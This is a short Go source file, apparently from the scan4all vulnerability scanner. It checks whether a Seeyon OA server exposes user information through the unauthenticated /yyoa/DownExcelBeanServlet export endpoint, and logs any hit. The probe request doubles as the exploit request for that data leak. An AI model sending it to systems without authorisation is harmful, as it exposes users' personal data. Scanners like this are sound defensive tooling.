package seeyon

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

//DownExcelBeanServlet 用户敏感信息泄露

func DownExcelBeanServlet(u string) bool {
	var vuln = false
	if req, err := util.HttpRequset(u+"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && req.Header.Get("Content-disposition") != "" {
			util.SendLog(req.RequestUrl, "seeyon", "Found vuln seeyon DownExcelBeanServlet", "")
			vuln = true
		}
	}
	return vuln
}
